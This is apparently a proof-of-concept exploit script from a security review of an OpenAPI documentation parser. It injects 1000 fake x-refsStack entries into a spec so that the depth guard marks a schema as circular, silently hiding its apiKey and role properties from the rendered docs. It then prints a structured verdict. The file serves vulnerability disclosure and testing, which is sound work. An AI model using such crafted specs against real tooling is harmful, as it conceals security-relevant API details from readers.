/**
 * PoC: x-refsStack injection bypasses cycle detection → silent schema suppression
 *
 * Finding: M6
 * File:    src/services/OpenAPIParser.ts:93-94 (injection), :108 (depth check)
 *          src/services/models/Schema.ts:118 + :157-158 (early return)
 *
 * Root cause:
 *   deref() at line 93-94 reads `obj['x-refsStack']` from the spec object and
 *   concatenates it onto the live baseRefsStack with no provenance check:
 *
 *     const objRefsStack = obj?.['x-refsStack'];          // line 93
 *     baseRefsStack = concatRefStacks(baseRefsStack, objRefsStack); // line 94
 *
 *   The depth guard at line 108 fires when `baseRefsStack.length > MAX_DEREF_DEPTH`
 *   (strictly greater than 999).  By injecting exactly 1000 fake entries the
 *   guard triggers immediately for the first real $ref, stamping the resolved
 *   schema with `x-circular-ref: true`.  Schema.init() sees that flag at line
 *   157-158 and returns early, silently dropping all properties.
 *
 * Attack vector:
 *   The injection site is most naturally an allOf member (hoistOneOfs already
 *   writes x-refsStack onto allOf members at OpenAPIParser.ts:379), but any
 *   schema object passed to deref() works — including a top-level $ref wrapper
 *   with an x-refsStack sibling key.
 *
 * Usage:
 *   npx ts-node --project /Users/<user>/Desktop/oss-to-run/acme/tsconfig.json poc.js
 */

'use strict';

// ---------------------------------------------------------------------------
// 1. Build the malicious spec
//    MAX_DEREF_DEPTH = 999 (OpenAPIParser.ts:8), check is STRICTLY GREATER.
//    We inject 1000 fake entries so that after concat baseRefsStack.length==1000
//    and 1000 > 999 evaluates TRUE at line 108.
// ---------------------------------------------------------------------------
const MAX_DEREF_DEPTH = 999;
const INJECT_COUNT    = MAX_DEREF_DEPTH + 1;  // 1000 — sufficient to trip guard

const fakeStack = Array.from({ length: INJECT_COUNT }, (_, i) => `#/fake/ref${i}`);

const spec = {
  openapi: '3.0.0',
  info: { title: 'PoC — M6 x-refsStack injection', version: '0.0.1' },
  paths: {},
  components: {
    schemas: {
      // Victim schema — security-relevant fields that MUST always be visible.
      VictimSchema: {
        type: 'object',
        description: 'Authentication schema — all fields are security-critical',
        properties: {
          apiKey: { type: 'string', description: 'Secret API key — MUST be visible' },
          role:   { type: 'string', description: 'User role — MUST be visible'      },
        },
        required: ['apiKey', 'role'],
      },

      // Attacker-controlled schema.
      // x-refsStack is a valid OpenAPI x-* extension field; spec authors may
      // set any x-* without violating the spec.  Acme treats this internal
      // field name as trusted, but it is spec-author-supplied here.
      AttackSchema: {
        'x-refsStack': fakeStack,          // injection: OpenAPIParser.ts:93
        $ref: '#/components/schemas/VictimSchema',
      },
    },
  },
};

// ---------------------------------------------------------------------------
// 2. Load real OpenAPIParser via ts-node (no mocks, no stubs)
// ---------------------------------------------------------------------------
let OpenAPIParser;
try {
  const mod  = require('/Users/<user>/Desktop/oss-to-run/acme/src/services/OpenAPIParser');
  OpenAPIParser = mod.OpenAPIParser;
} catch (e) {
  console.error('FATAL: could not load OpenAPIParser:', e.message);
  process.exit(2);
}

const { AcmeNormalizedOptions } =
  require('/Users/<user>/Desktop/oss-to-[REDACTED]');

// ---------------------------------------------------------------------------
// 3. Baseline — deref VictimSchema with an empty stack (no injection)
// ---------------------------------------------------------------------------
const opts   = new AcmeNormalizedOptions({});
const parser = new OpenAPIParser(spec, undefined, opts);

console.log('--- BASELINE: deref VictimSchema directly (empty stack) ---');
const baseResult = parser.deref({ $ref: '#/components/schemas/VictimSchema' }, []);
const baseCircular  = !!baseResult.resolved['x-circular-ref'];
const baseHasProps  = !!baseResult.resolved.properties;
console.log('  x-circular-ref  :', baseCircular);
console.log('  properties found:', baseHasProps);
console.log('  stack depth out :', baseResult.refsStack.length);

// ---------------------------------------------------------------------------
// 4. Attack — deref AttackSchema whose x-refsStack pre-fills the stack
// ---------------------------------------------------------------------------
console.log('');
console.log('--- ATTACK: deref AttackSchema with injected x-refsStack[' + INJECT_COUNT + '] ---');

// Manually trace the critical path for evidence clarity:
const injectedObj   = spec.components.schemas.AttackSchema;
const stackAfterInj = [].concat(injectedObj['x-refsStack']);  // mirrors line 94
console.log('  baseRefsStack.length after concat :', stackAfterInj.length,
            '(> ' + MAX_DEREF_DEPTH + '?', stackAfterInj.length > MAX_DEREF_DEPTH, ')');

const attackResult   = parser.deref(injectedObj, []);
const attackCircular = !!attackResult.resolved['x-circular-ref'];
const attackHasProps = !!attackResult.resolved.properties;
console.log('  x-circular-ref   :', attackCircular);
console.log('  properties found :', attackHasProps);

// ---------------------------------------------------------------------------
// 5. Schema.ts:157-158 simulation — the downstream effect
// ---------------------------------------------------------------------------
console.log('');
console.log('--- Schema.init() simulation (Schema.ts:118 + :157-158) ---');
let propertiesRendered;
if (attackCircular) {
  propertiesRendered = false;
  console.log('  this.isCircular = true  →  init() returns at Schema.ts:158');
  console.log('  EFFECT: apiKey and role silently suppressed from rendered documentation');
} else {
  propertiesRendered = true;
  console.log('  this.isCircular = false →  properties rendered normally');
}

// ---------------------------------------------------------------------------
// 6. Structured verdict — LAST stdout line (parsed by poc-runner)
// ---------------------------------------------------------------------------
console.log('');
const confirmed = attackCircular && !baseCircular;

console.log(JSON.stringify({
  status:   confirmed ? 'confirmed' : 'failed',
  evidence: confirmed
    ? 'VictimSchema resolved with x-circular-ref:true via spec-supplied x-refsStack[1000]; Schema.init() returns early at line 157-158 suppressing all properties (apiKey, role)'
    : `x-circular-ref not set after injection; stackAfterInj.length=${stackAfterInj.length}`,
  notes: `Baseline: x-circular-ref=${baseCircular} properties=${baseHasProps}. ` +
         `Attack: x-circular-ref=${attackCircular} properties=${attackHasProps} ` +
         `stackDepth=${stackAfterInj.length}>${MAX_DEREF_DEPTH}=${stackAfterInj.length > MAX_DEREF_DEPTH}.`,
}));
